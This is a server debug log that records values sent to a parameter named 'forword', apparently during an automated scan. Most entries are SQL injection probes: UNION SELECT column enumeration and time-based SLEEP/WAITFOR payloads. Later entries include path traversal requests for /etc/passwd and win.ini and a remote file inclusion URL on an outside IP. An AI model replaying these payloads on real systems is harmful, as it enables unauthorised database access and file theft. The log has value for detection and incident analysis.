[2015-10-17 22:36:26][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:27][debug] forword：0) UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:27][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 22:36:28][debug] forword：0 UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:28][debug] forword：0) UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:29][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:29][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 22:36:30][debug] forword：0 UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 22:36:30][debug] forword：0 UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:31][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:31][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:32][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:32][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 22:36:33][debug] forword：0 UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 22:36:33][debug] forword：0 UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 22:36:34][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:34][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:35][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:35][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:36][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:36][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 22:36:37][debug] forword：0 UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 22:36:37][debug] forword：0 UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 22:36:38][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 22:36:38][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:39][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:39][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:40][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:40][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:41][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:41][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:36:42][debug] forword：0 UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 22:36:42][debug] forword：0 UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 22:36:43][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 22:36:43][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 22:36:44][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:44][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:45][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:45][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:46][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:46][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:47][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:47][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:36:48][debug] forword：0 UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:36:48][debug] forword：0 UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 22:36:49][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 22:36:49][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 22:36:50][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 22:36:50][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:51][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:51][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:52][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:52][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:53][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:53][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:54][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:54][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:36:55][debug] forword：0 UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:36:55][debug] forword：0 UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:36:56][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 22:36:56][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 22:36:57][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 22:36:57][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 22:36:58][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:58][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:59][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:36:59][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:00][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:00][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:00][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:01][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:01][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:02][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:37:02][debug] forword：0 UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:37:03][debug] forword：0 UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:37:03][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:37:04][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 22:37:04][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 22:37:05][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 22:37:05][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 22:37:06][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:06][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:07][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:07][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:08][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:08][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:09][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:09][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:10][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:10][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:11][debug] forword：0 UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:37:11][debug] forword：0 UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:37:12][debug] forword：0 UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:37:12][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:37:13][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[2015-10-17 22:37:13][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[2015-10-17 22:37:14][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[2015-10-17 22:37:14][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[2015-10-17 22:37:15][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[2015-10-17 22:37:15][debug] forword：0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:16][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:16][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:17][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:17][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:18][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:18][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:19][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:19][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:20][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:20][debug] forword：0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[2015-10-17 22:37:21][debug] forword：0 AND SLEEP(5)
[2015-10-17 22:37:21][debug] forword：0 AND SLEEP(5) #
[2015-10-17 22:37:22][debug] forword：0; SELECT PG_SLEEP(5)--
[2015-10-17 22:37:22][debug] forword：0; SELECT SLEEP(5)-- 
[2015-10-17 22:37:23][debug] forword：0'; SELECT SLEEP(5)-- 
[2015-10-17 22:37:23][debug] forword：0) AND SLEEP(5) #
[2015-10-17 22:37:24][debug] forword：0'; SELECT SLEEP(5)--
[2015-10-17 22:37:24][debug] forword：0 WAITFOR DELAY '0:0:5'--
[2015-10-17 22:37:25][debug] forword：0
[2015-10-17 22:37:25][debug] forword：0
[2015-10-17 22:37:26][debug] forword：0
[2015-10-17 22:37:26][debug] forword：0
[2015-10-17 22:37:27][debug] forword：0
[2015-10-17 22:37:27][debug] forword：0
[2015-10-17 22:37:28][debug] forword：0
[2015-10-17 22:37:28][debug] forword：0
[2015-10-17 22:37:29][debug] forword：0
[2015-10-17 22:37:29][debug] forword：0
[2015-10-17 22:37:30][debug] forword：0
[2015-10-17 22:37:30][debug] forword：0
[2015-10-17 22:37:30][debug] forword：0
[2015-10-17 22:37:31][debug] forword：0
[2015-10-17 22:37:31][debug] forword：0
[2015-10-17 22:37:32][debug] forword：0
[2015-10-17 22:37:32][debug] forword：0
[2015-10-17 22:37:33][debug] forword：0
[2015-10-17 22:37:33][debug] forword：0
[2015-10-17 22:37:34][debug] forword：0
[2015-10-17 22:37:34][debug] forword：0
[2015-10-17 22:37:35][debug] forword：
[2015-10-17 22:37:35][debug] forword：0
[2015-10-17 22:37:35][debug] forword：0
[2015-10-17 22:37:36][debug] forword：0
[2015-10-17 22:37:36][debug] forword：0
[2015-10-17 22:37:37][debug] forword：0
[2015-10-17 22:37:38][debug] forword：0
[2015-10-17 22:37:38][debug] forword：0
[2015-10-17 22:37:39][debug] forword：0
[2015-10-17 22:37:39][debug] forword：0
[2015-10-17 22:37:40][debug] forword：0
[2015-10-17 22:37:40][debug] forword：0
[2015-10-17 22:37:40][debug] forword：0
[2015-10-17 22:37:41][debug] forword：0
[2015-10-17 22:37:41][debug] forword：0
[2015-10-17 22:37:42][debug] forword：0
[2015-10-17 22:37:42][debug] forword：0
[2015-10-17 22:37:43][debug] forword：0
[2015-10-17 22:37:43][debug] forword：0
[2015-10-17 22:37:44][debug] forword：0
[2015-10-17 22:37:44][debug] forword：0
[2015-10-17 22:37:45][debug] forword：0
[2015-10-17 22:37:45][debug] forword：0
[2015-10-17 22:37:46][debug] forword：0
[2015-10-17 22:37:46][debug] forword：0
[2015-10-17 22:37:47][debug] forword：0
[2015-10-17 22:37:47][debug] forword：0
[2015-10-17 22:37:48][debug] forword：0
[2015-10-17 22:37:48][debug] forword：0
[2015-10-17 22:37:49][debug] forword：0
[2015-10-17 22:37:49][debug] forword：0
[2015-10-17 22:37:50][debug] forword：0
[2015-10-17 22:37:50][debug] forword：0
[2015-10-17 22:37:51][debug] forword：0
[2015-10-17 22:37:51][debug] forword：0
[2015-10-17 22:37:52][debug] forword：0
[2015-10-17 22:37:52][debug] forword：0
[2015-10-17 22:37:53][debug] forword：0
[2015-10-17 22:37:53][debug] forword：0
[2015-10-17 22:37:54][debug] forword：0
[2015-10-17 22:37:54][debug] forword：0
[2015-10-17 22:37:55][debug] forword：0
[2015-10-17 22:37:55][debug] forword：0
[2015-10-17 22:37:56][debug] forword：0
[2015-10-17 22:37:56][debug] forword：0
[2015-10-17 22:37:57][debug] forword：0
[2015-10-17 22:37:57][debug] forword：0
[2015-10-17 22:37:58][debug] forword：0
[2015-10-17 22:37:58][debug] forword：0
[2015-10-17 22:37:58][debug] forword：0
[2015-10-17 22:37:59][debug] forword：0
[2015-10-17 22:37:59][debug] forword：/etc/passwd
[2015-10-17 22:37:59][debug] forword：0
[2015-10-17 22:38:00][debug] forword：0
[2015-10-17 22:38:00][debug] forword：0
[2015-10-17 22:38:01][debug] forword：0
[2015-10-17 22:38:01][debug] forword：0
[2015-10-17 22:38:01][debug] forword：0
[2015-10-17 22:38:02][debug] forword：0
[2015-10-17 22:38:02][debug] forword：0
[2015-10-17 22:38:03][debug] forword：0
[2015-10-17 22:38:03][debug] forword：../../../../../../../../etc/passwd
[2015-10-17 22:38:03][debug] forword：0
[2015-10-17 22:38:04][debug] forword：0
[2015-10-17 22:38:04][debug] forword：0
[2015-10-17 22:38:04][debug] forword：0
[2015-10-17 22:38:05][debug] forword：0
[2015-10-17 22:38:05][debug] forword：../../../../../../../../etc/passwd .jpg
[2015-10-17 22:38:05][debug] forword：0
[2015-10-17 22:38:06][debug] forword：0
[2015-10-17 22:38:06][debug] forword：0
[2015-10-17 22:38:06][debug] forword：0
[2015-10-17 22:38:07][debug] forword：0
[2015-10-17 22:38:07][debug] forword：../../../../../../../../../../etc/passwd%00
[2015-10-17 22:38:07][debug] forword：0
[2015-10-17 22:38:08][debug] forword：0
[2015-10-17 22:38:08][debug] forword：0
[2015-10-17 22:38:08][debug] forword：0
[2015-10-17 22:38:09][debug] forword：0
[2015-10-17 22:38:09][debug] forword：../../../../../../../../windows/win.ini
[2015-10-17 22:38:09][debug] forword：0
[2015-10-17 22:38:10][debug] forword：0
[2015-10-17 22:38:10][debug] forword：0
[2015-10-17 22:38:10][debug] forword：0
[2015-10-17 22:38:11][debug] forword：0
[2015-10-17 22:38:11][debug] forword：../../../../../../../../windows/win.ini .jpg
[2015-10-17 22:38:11][debug] forword：0
[2015-10-17 22:38:12][debug] forword：0
[2015-10-17 22:38:12][debug] forword：0
[2015-10-17 22:38:13][debug] forword：0
[2015-10-17 22:38:13][debug] forword：0
[2015-10-17 22:38:13][debug] forword：0
[2015-10-17 22:38:14][debug] forword：0
[2015-10-17 22:38:14][debug] forword：0
[2015-10-17 22:38:15][debug] forword：0
[2015-10-17 22:38:15][debug] forword：0
[2015-10-17 22:38:16][debug] forword：0
[2015-10-17 22:38:16][debug] forword：0
[2015-10-17 22:38:17][debug] forword：0
[2015-10-17 22:38:17][debug] forword：0
[2015-10-17 22:38:18][debug] forword：0
[2015-10-17 22:38:18][debug] forword：http://120.26.55.211/s.txt
[2015-10-17 22:38:18][debug] forword：0
[2015-10-17 22:38:19][debug] forword：0
[2015-10-17 22:38:19][debug] forword：0
[2015-10-17 22:38:20][debug] forword：0
[2015-10-17 22:38:20][debug] forword：0
[2015-10-17 22:38:20][debug] forword：0
[2015-10-17 22:38:21][debug] forword：0
[2015-10-17 22:38:21][debug] forword：0
[2015-10-17 22:38:22][debug] forword：0
[2015-10-17 22:38:22][debug] forword：http://120.26.55.211/s.txt
[2015-10-17 22:38:22][debug] forword：0
[2015-10-17 22:38:23][debug] forword：0
[2015-10-17 22:38:23][debug] forword：0
[2015-10-17 22:38:24][debug] forword：0
[2015-10-17 22:38:24][debug] forword：0
[2015-10-17 22:38:24][debug] forword：0
[2015-10-17 22:38:24][debug] forword：0
[2015-10-17 22:38:25][debug] forword：0
[2015-10-17 22:38:26][debug] forword：0
[2015-10-17 22:38:26][debug] forword：a_long_name_file_not_exist
[2015-10-17 22:38:26][debug] forword：0
[2015-10-17 22:38:26][debug] forword：0
[2015-10-17 22:38:27][debug] forword：0
[2015-10-17 22:38:27][debug] forword：0
[2015-10-17 22:38:28][debug] forword：0
[2015-10-17 22:38:28][debug] forword：0
[2015-10-17 22:38:28][debug] forword：0
[2015-10-17 22:38:29][debug] forword：0
[2015-10-17 22:38:29][debug] forword：0
[2015-10-17 22:38:30][debug] forword：0
[2015-10-17 22:38:30][debug] forword：0
[2015-10-17 22:38:30][debug] forword：0
[2015-10-17 22:38:31][debug] forword：0
[2015-10-17 22:38:31][debug] forword：0
[2015-10-17 22:38:32][debug] forword：0
[2015-10-17 22:38:32][debug] forword：0
